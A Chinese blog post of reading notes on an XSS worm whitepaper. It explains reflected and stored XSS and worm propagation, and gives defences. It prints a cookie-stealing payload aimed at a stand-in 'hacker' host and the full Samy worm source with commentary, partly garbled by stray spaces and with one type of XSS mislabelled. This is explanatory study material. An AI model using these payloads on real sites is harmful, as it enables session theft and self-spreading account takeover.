---
title: 读本好书 《XSS 蠕虫 & 病毒》
url: 486.html
id: 486
categories:
  - 未分类
date: 2018-12-24 00:00:00
tags:
---

前
-

突然一个状态的转变,总是需要好解的转变的时间。

事前比较多，感觉自己在知识的荒野上已经漫步了好久。时而有着恐慌的感觉。

简介
--

*   书名：XSS 蠕虫 & 病毒
*   副标题：即将发生的威胁与最好的防御
*   作者：June 2007 – updated Jeremiah Grossman
*   翻译：[Fooying](http://hi.baidu.com/fooying)（知道创宇安全研究团队）
*   来源：[GitBook](https://wizardforcel.gitbooks.io/xss-worms-and-viruses/content/0.html)

一本篇幅短小的书，主要是将关于 XSS蠕虫 的书籍， 这个蠕虫其实都不陌生，一年前，记得qq空间里面的自动转发，这个就是和书里的主角有关系了。

简单来说，XSS 在用户的浏览器端注入了目标代码，用于伪造了用户的操作，然而使用 XSS 的蠕虫，可以在用户的repost 的内容里面再次插入恶意JS 实现了自我的复制以及传播。

这篇文章， 作为对这个技术的了解以及认识吧。

> 在本白皮书中，我们将提供一个关于 XSS 的概述;定义 XSS 蠕虫;检验传播方式，感染率和潜在的影响。最重要的是，我们将描述如何立即采取措施，企业可以采取以捍卫他们的网站。

XSS蠕虫的知识点
---------

这里用自己的观点总结一下：

1.  来自于可以有用户输入的地方
    
2.  XSS 依附于web 比桌面的 应用程序的 worm 更加快速广泛
    
3.  > 与操作系统（Windows，Linux 和 Macintosh OS X 等等）无关，因为是在 Web 浏览器发生并执行的。
    
4.  > 能够避免网络堵塞,因为通过 Web 服务器到 Web 浏览器（客户端 - 服务器）模式传播，而不是一个典型的盲目的 对等模型。
    
5.  XSS蠕虫 依附于 web 的服务本身。
    
6.  > 比传统互联网病毒更容易停下来，因为拒绝感染网站的访问可以被隔离以阻止传播。
    
    因为XSS 的漏洞是存在于 web 页面之上，出现了可能存储XSS的注入js 的地方，但是一旦进行过滤，或者，对其行为进行阻止，其传播途径便受阻了。
    

XSS知识点
------

非持久型XSS，也成为反射性的XSS。用户输入在一个动作后会出现在用户页面上，二实际上并不会进行存储。

所以可以理解为，是用户构建的一次性的反射XSS , 一般出现在 **get型的搜索页面** 中。因为用户提交的搜索内容，会再次的出现在了页面之中。座椅这样被可以出发了，XSS。

当然，反射型的 XSS 在进行构造之后通过用户点击进行触法，多半用于phishing 的过程之中。

eg:在存在反射型的XSS 的时候可以构造如下链接形式：

    http://victim/search.pl?search=test+search+[payload]
    ”><SCRIPT>alert(‘XSS%20Testing’)</SCRIPT>

这样我们的 payload 就出现在了搜索结果的页面中去，所以就可以被触发。

一般用于钓鱼链接，当然一旦有了入口就可以实现更加复杂的功能了。

使用如下的payload

```php+HTML ">var+img=new+Image();img.src=&quot;<a href="http://hacker/”%20+%20document.cookie">http://hacker/”%20+%20document.cookie</a>;

    
    这样就构造了一个DOM的对象，就向目标网站提交了用户的 cookies。（当然也可使用 ajax 进行高级操作）。
    
    ------
    
    非持久型XSS，这一类的XSS 就是危害比较大的类型，多存在于留言板之类用于存储并且显示用户输入的地方。用户输入的内容没有经过严格的检测，导致直接在页面上被加载以及解析，导致访问该页面的用户都受到影响。
    
    危害性往往的是高于非持久性的。具体的利用细节，实际上也是对过滤进行 bypass ， 之后注入js 等待用户的触发。
    
    ## XSS 的传播方法
    
    > XSS 蠕虫病毒可能会使 得浏览器进行发送电子邮件，转账，删除/修改数据，入侵其他网站，下载非法内容，以及许多其他形式的恶意活动。 用最简单的方式去理解，就是如果没有适当的防御，在网站上的任何功能都可以在未经用户许可的情况下运行。
    
    ------
    
    XSS 的漏洞被利用在传播的时候，通常是 `HTML/Javascript`的代码。使用 
    
    - 嵌入的HTML标签
    - JavaScript DOM的对象
    - XMLHTTPRequest（XHR）
    
    ------
    
    ### 嵌入的HTML标签
    
    一些html的标签，可以在加载的时候去请求非同源的资源。比如，img 的图像标签便可以实现这样的一个功能。
    
    使用 img 的src属性可以在加载页面的时候，对远程的主机进行请求。
    
    ```html
    <img src=”http://www.google.com/search?hl=en&q=whitehat+security&btnG=Google+Search”>

在上面的请求里面，知识进行了一次对 google 的请求，当然，这里的地址便可以模拟一次用户的请求，比如：增加删除好友。这是一个 get 的请求，当然也可以通过get 的方式向，目标主机传递当前的数据。

* * *

### JavaScript 和 DOM

`DOM = document object model` 这里一样可以使用DOM对象，实现一个对非同源站点的请求。

    var img = new Image();
    img.src = "http://www.google.com/search?hl=en&q=whitehat+security&btnG=Google+Search"

通过改变图像的src属实现去其他的请求。

### XmlHttpRequest (XHR)

`AJAX (异步 JavaScript 和 XML)` JQuery中包含 ajax 的功能，一样实现对远程主机提交数据。

第一个XSS蠕虫在 2005年10月4日，

> 使用一些绕过技 术，Samy 成功上传了他的代码。当一个通过身份验证 MySpace 的用户观看 Samy 的个人资料，该蠕虫病毒的 payload 使用 XHR，使得用户的网页浏览器发送请求，增加 Samy 为朋友，包括加 Samy 为他英雄（译者注：类似微博关注）（“但最重要的是，加 Samy 为英雄这点”，如图 6），并用恶意代码的副本改变用户的个人资料。当用户访问 Samy 或 者其他受感染用户的个人资料页，他们基本上在打开浏览器时就受到攻击。

这里的vector 是关注了目标用户，payload 是在用户的个人信息上插入了XSS的代码。

XSS 蠕虫和常规的桌面蠕虫
--------------

信息

时间

数量

voctor

Code Red I 和 Code Red II(红色代码)

2001 年 7 月 12 日

275,000

IIS Web 服务的缓冲区溢出

Slammer(地狱)

2003 年 1 月 25 日

55,000

Microsoft SQL Server 缓冲 区溢出漏洞

Blaster(冲击波)

2003 年 8 月 11 号

336,000

远程过程调用（RPC）

Samy

1,000,000

> XSS 蠕虫和病毒有一个分布的中心点，Web 服务器，并且执行只发生在 Web 浏览器。接下来，攻击代码只从 Web 服务器发送到浏览器，反之亦然（见图 9），而不是从浏览器到浏览器或其他蠕虫的对等情况。这个特性减少了 网络噪声的体积。此外，每个网站访问代表一个活的计算机和可能的受害者，因为 XSS 恶意软件是不依赖于操作系 统。因此，感染的成功率要大得多。

严格的分析 XSS 蠕虫之所以更加广泛传播的原因。其传播方式部署对等的。

> 在本白皮书中开头，我们问：“拥有和控制着超过一百万可支配的 Web 浏览器和千兆带宽，可以做什么？”大规模的分布式拒绝服务攻击（DDoS）是一个简单的答案。让我们保守地说，每个浏览器有一个 128 Kb / s 的平均速 度（千比特/秒），并能产生一个 HTTP 请求，每秒的组合拨号，DSL，电缆，和 T-1 连接。其结果将是 128,000,000 Kb/ s 或 122 Gb / s 的吞吐量和每秒 1,000,000 HTTP 请求- 无疑是一个巨大的资源集合的访问。

这样无疑会有十分巨大的受控资源。

防御手段
----

在用户的层面上：

> 1.  点击链接发送电子邮件或即时消息时一定要谨慎。可疑的过长链接，尤其是那些看起来像是包含 HTML 代码 的链接。如果有疑问，手动输入网址到您的浏览器地址栏进行访问。
> 2.  对于 XSS 漏洞，没有网络浏览器有一个明显的安全优势。话虽如此，但作者喜欢 Firefox 浏览器。为了获得 额外的安全性，可以考虑安装一些浏览器插件，如 NoScript25（Firefox 扩展插件）或 Netcraft 工具栏 26。
> 3.  虽然不是 100％有效，但是避开可疑网站，如那些提供黑客自动化工具，warez，或色情的网站是明智的。

在开发者的角度上说：

*   在敏感操作的时候需要进行验证码请求，避免直接使用反射型的XSS进行请求
*   提交内容进行严格过滤

书中的附录
-----

    <FORM ACTION=”http://server/path/” NAME=”myform” METHOD=”POST”>
    <INPUT TYPE=”HIDDEN” NAME=”Username” VALUE=”Foo”>
    <INPUT TYPE=”HIDDEN” NAME=”Password” VALUE=”Bar”>
    </FORM>

这里构建的一个表单，一样可以使用 JS 进行提交

    <SCRIPT language=”JavaScript”> document.myform.submit();
    </SCRIPT>

* * *

通过 XHR 进行模拟请求：

    var req = new XMLHttpRequest();
    req.open(‘GET’, ‘http://server/path)/’, true);
    req.onreadystatechange = function () {
        if (req.readyState == 4) {
            alert(req.responseText);
        }
    };
    req.send(null);

Samy 蠕虫的源码 以及 个人的解读
-------------------

    <div id=mycode style=”BACKGROUND: url('javascript:eval(document.all.mycode.expr)')” expr=”
    var B = String.fromCharCode(34);
    var A = String.fromCharCode(39);
    function g() {
        var C;
        try {
            var D = document.body.createTextRange(); C = D.htmlText
        } catch (e) {}
        if (C) {
            return C
        } else {
            return eval('document.body.innerHTML')
        }
    }
    function getFromURL(BF, BG) {
        var T;
        if (BG == 'Mytoken') {
            T = B
        } else {
            T = ' & '
        }
        var U = BG + ' = ';
        var V = BF.indexOf(U) + U.length;
        var W = BF.substring(V, V + 1024);
        var X = W.indexOf(T);
        var Y = W.substring(0, X);
        return Y
    }
    function getData(AU) {
        M = getFromURL(AU, 'friendID');
        L = getFromURL(AU, 'Mytoken')
    }
    function getQueryParams() {
        var E = document.location.search;
        var F = E.substring(1, E.length).split(' & ');
        var AS = new Array();
        for (var O = 0; O < F.length; O++) {
            var I = F[O].split(' = ');
            AS[I[0]] = I[1]
        }
        return AS
    }
    var J;
    var AS = getQueryParams();
    var L = AS['Mytoken'];
    var M = AS['friendID'];
    if (location.hostname == 'profile.myspace.com') {
        document.location
            = 'http: //www.myspace.com' + location.pathname + location.search
    } else {
        if (!M) {
            getData(g())
        }
        main()
    }
    function getClientFID() {
        return findIn(g(), 'up_launchIC(' + A, A)
    }
    function nothing() {}
    function paramsToString(AV) {
        var N = new String();
        var O = 0;
        for (var P in AV) {
            if (O > 0) {
                N += ' & '
            }
            var Q = escape(AV[P]);
            while (Q.indexOf(' + ') != -1) {
                Q = Q.replace(' + ', ' % 2B')
            }
            while (Q.indexOf(' & ') != -1) {
                Q = Q.replace(' & ', ' % 26')
            }
            N += P + ' = ' + Q; O++
        }
        return N
    }
    function httpSend(BH, BI, BJ, BK) {
        if (!J) {
            return false
        }
        eval('J.onr' + 'eadystatechange = BI');
        J.open(BJ, BH, true);
        if (BJ == 'POST') {
            J.setRequestHeader('Content - Type', 'application / x - www - form - urlencoded');
            J.setRequestHeader('Content - Length', BK.length)
        }
        J.send(BK); return true
    }
    function findIn(BF, BB, BC) {
        var R = BF.indexOf(BB) + BB.length;
        var S = BF.substring(R, R + 1024);
        return S.substring(0, S.indexOf(BC))
    }
    function getHiddenParameter(BF, BG) {
        return findIn(BF, 'name = ' + B + BG + B + 'value = ' + B, B)
    }
    function getXMLObj() {
        var Z = false;
        if (window.XMLHttpRequest) {
            try {
                Z = new XMLHttpRe - quest()
            } catch(e) {
                Z = false
            }
        } else if (window.ActiveXObject) {
            try {
                Z = new ActiveXOb - ject('Msxml2.XMLHTTP')
            } catch (e) {
                try {
                    Z = new ActiveXOb - ject('Microsoft.XMLHTTP')
                } catch (e) {
                    Z = false
                }
            }
        }
        return Z
    }
    var AA = g();
    var AB = AA.indexOf('m' + 'ycode');
    var AC = AA.substring(AB, AB + 4096);
    var AD = AC.indexOf('D' + 'IV');
    var AE = AC.substring(0, AD);
    var AF;
    if (AE) {
        AE = AE.replace('jav' + 'a', A + 'jav' + 'a');
        AE = AE.replace('exp' + 'r)', 'exp' + 'r)' + A);
        AF = 'but most of all,samy is my hero. < d' + 'iv id = ' + AE + 'D' + 'IV > '
    }
    var AG;
    function getHome() {
        if (J.readyState != 4) {
            return
        }
        var AU = J.responseText;
        AG = findIn(AU, 'P' + 'rofileHeroes', ' < /td>');
        AG = AG.substring(61, AG.length);
        if (AG.indexOf('samy') == -1) {
            if (AF) {
                AG += AF;
                var AR = getFromURL(AU, 'Mytoken');
                var AS = new Ar - ray();
                AS['interestLabel'] = 'heroes';
                AS['submit'] = 'Preview';
                AS['interest'] = AG;
                J = getXMLObj();
                httpSend('/index.cfm ? fuseaction = profile.previewInterests & Mytoken = ' + AR,
                    postHero, 'POST', paramsToString(AS))
            }
        }
    }
    function postHero() {
        if (J.readyState != 4) {
            return
        }
        var AU = J.responseText;
        var AR = getFromURL(AU, 'Mytoken');
        var AS = new Ar - ray();
        AS['interestLabel'] = 'heroes';
        AS['submit'] = 'Submit';
        AS['interest'] = AG;
        AS['hash'] = getHiddenParame - ter(AU, 'hash');
        httpSend(' / index.cfm ? fuseaction = profile.processInterests & Mytoken = ' + AR,
            nothing, 'POST', paramsToString(AS))
    }
    function main() {
        var AN = getClientFID();
        var BH = ' / index.cfm ? fuseaction = user.viewProfile & friendID = ' + AN + ' & Mytoken = ' + L;
        J = getXMLObj();
        httpSend(BH, getHome, 'GET');
        xmlhttp2 = getXMLObj();
        httpSend2(' / index.cfm ? fuseaction = invite.addfriend_verify & friendID = 11851658 & Mytoken = ' + L,
            processxForm, 'GET')
    }
    function processx - Form() {
        if (xmlhttp2.readyState != 4) {
            return
        }
        var AU = xmlhttp2.responseText;
        var AQ = getHiddenParameter(AU, 'hashcode');
        var AR = getFromURL(AU, 'Mytoken');
        var AS = new Array();
        AS['hashcode'] = AQ;
        AS['friendID'] = '11851658';
        AS['submit'] = 'Add to Friends';
        httpSend2(' / index.cfm ? fuseaction = invite.addFriendsProcess & Mytoken = ' + AR,
            nothing, 'POST', paramsToString(AS))
    }
    function httpSend2(BH, BI, BJ, BK) {
        if (!xmlhttp2) {
            return false
        }
        eval('xmlhttp2.onr' + 'eadystatechange = BI');
        xmlhttp2.open(BJ, BH, true);
        if (BJ == 'POST') {
            xmlhttp2.setRequestHeader('Content - Type', 'application / x - www - form - urlencoded'); xmlhttp2.setRequestHeader('Content - Length', BK.length)
        }
        xmlhttp2.send(BK); return true
    }
    ”></DIV>

这里就是这个蠕虫的前导代码了

    var J;
    var AS = getQueryParams();  // 这里是获取用户的信息栏
    var L = AS['Mytoken'];
    var M = AS['friendID'];
    if (location.hostname == 'profile.myspace.com') {
        document.location
            = 'http: //www.myspace.com' + location.pathname + location.search
        // 这里进行重定向到 www 站点从用户的属性页面
    } else {
        // 如果这里不是在用户的属性页面，是在浏览页面时候遇上的，就开始工作了！
        if (!M) {
            getData(g())    // g 返回页面特定内容
        }
        main()  // ready to go
    }

* * *

`getdata` 的函数内容很容易理解

    function getData(AU) {
        M = getFromURL(AU, 'friendID');
        L = getFromURL(AU, 'Mytoken')
    }

这里是 得到用户的属性页的列表：

    function getQueryParams() {
        var E = document.location.search;
        var F = E.substring(1, E.length).split(' & ');
        var AS = new Array();
        for (var O = 0; O < F.length; O++) {
            var I = F[O].split(' = ');
            AS[I[0]] = I[1]
        }
        return AS
    }

从这个的标签可以看出，此处实际上没有进行XSS的过滤，所以可以直接提交一个 div 标签，就可以实现 XSS 代码的存储。

* * *

    function main() {
        var AN = getClientFID();    // 取得uid
        var BH = ' / index.cfm ? fuseaction = user.viewProfile & friendID = ' + AN + ' & Mytoken = ' + L;   
        J = getXMLObj();            // 取得 http交互示例
        httpSend(BH, getHome, 'GET');   // 伪造浏览用户 profile 的动作 // 这里可能报异常
        xmlhttp2 = getXMLObj();         // 这里得到一个 HTTP 交互的示例
        httpSend2(' / index.cfm ? fuseaction = invite.addfriend_verify & friendID = 11851658 & Mytoken = ' + L,
            processxForm, 'GET')
    }

* * *

在 `getXMLObj` 函数里面使用了比较hack 的写法，应该是避免了人一些针对关键字的检测，其具体的实现代码如下：

    function getXMLObj() {
        var Z = false;
        if (window.XMLHttpRequest) {
            try {
                Z = new XMLHttpRe - quest()     // 这里就是混淆
            } catch(e) {
                Z = false
            }
        } else if (window.ActiveXObject) {
            try {
                Z = new ActiveXOb - ject('Msxml2.XMLHTTP')  // 混淆
            } catch (e) { 
                try {
                    Z = new ActiveXOb - ject('Microsoft.XMLHTTP')
                } catch (e) {
                    Z = false
                }
            }
        }
        return Z
    }

* * *

    function httpSend(BH, BI, BJ, BK) {
        if (!J) {       // 这里的J是前面返回的 XHR 实例。
            return false
        }
        eval('J.onr' + 'eadystatechange = BI');     // 这里对核心操作进行混淆
        J.open(BJ, BH, true);   // 这里打开一个 XHR 请求 （方式，链接）
        if (BJ == 'POST') {
            J.setRequestHeader('Content - Type', 'application / x - www - form - urlencoded');
            J.setRequestHeader('Content - Length', BK.length)
        }
        J.send(BK); return true
    }

这里，使用了**eval对其状态回调进行了赋值。** 即在其完成后执行

    function getHome() {
        if (J.readyState != 4) {
            return
        }
        var AU = J.responseText;
        AG = findIn(AU, 'P' + 'rofileHeroes', ' < /td>');
        AG = AG.substring(61, AG.length);
        if (AG.indexOf('samy') == -1) {     // 这里判断当前用户是否是否关注了 samy
            if (AF) {
                AG += AF;
                var AR = getFromURL(AU, 'Mytoken');
                var AS = new Ar - ray();
                AS['interestLabel'] = 'heroes';
                AS['submit'] = 'Preview';
                AS['interest'] = AG;
                J = getXMLObj();
                httpSend('/index.cfm ? fuseaction = profile.previewInterests & Mytoken = ' + AR, postHero, 'POST', paramsToString(AS))  
                // 这里是核心部分提交对 samy 关注的请求
            }
        }
    }

上面的函数在http请求返回时候进行回调，实现添加 samy 关注的功能。

* * *

第二个，请求函数：

    function httpSend2(BH, BI, BJ, BK) {
        if (!xmlhttp2) {
            return false
        }
        eval('xmlhttp2.onr' + 'eadystatechange = BI');
        xmlhttp2.open(BJ, BH, true);
        if (BJ == 'POST') {
            xmlhttp2.setRequestHeader('Content - Type', 'application / x - www - form - urlencoded'); xmlhttp2.setRequestHeader('Content - Length', BK.length)
        }
        xmlhttp2.send(BK); return true
    }

上面函数的回调函数如下：

    function processxForm() {
        if (xmlhttp2.readyState != 4) {
            return
        }
        var AU = xmlhttp2.responseText;
        var AQ = getHiddenParameter(AU, 'hashcode');
        var AR = getFromURL(AU, 'Mytoken');
        var AS = new Array();
        AS['hashcode'] = AQ;
        AS['friendID'] = '11851658';
        AS['submit'] = 'Add to Friends';
        httpSend2(' / index.cfm ? fuseaction = invite.addFriendsProcess & Mytoken = ' + AR,
            nothing, 'POST', paramsToString(AS))
    }

* * *

    var AA = g();   // 代码这里获取页面的代码 
    var AB = AA.indexOf('m' + 'ycode');
    var AC = AA.substring(AB, AB + 4096);
    var AD = AC.indexOf('D' + 'IV');
    var AE = AC.substring(0, AD);
    // 这里的这几行，对页面的内容进行截取操作

这里对页面的内容进行获取，截取出需要的段。

    var B = String.fromCharCode(34);
    var A = String.fromCharCode(39);    // 这里的是 JS 的从AsCII 转字符的函数
    // 对应的是 ' 与 " 
    ...
    if (AE) {
        AE = AE.replace('jav' + 'a', A + 'jav' + 'a');
        AE = AE.replace('exp' + 'r)', 'exp' + 'r)' + A);
        AF = 'but most of all,samy is my hero. < d' + 'iv id = ' + AE + 'D' + 'IV > '
    }
    

这里如果存在了 目标的 内容，那么构造AE与AF 两段内容

Summary
-------

通过这本书,或者是这篇文章,简单的了解了一个XSS蠕虫的实现，以及其传播的原理，借助WEB层面的功能，通过用户的操作伪造，实现对samy 关注，和对自己的 profile 进行修改的功能，从而实现了 这个蠕虫的大面积传播。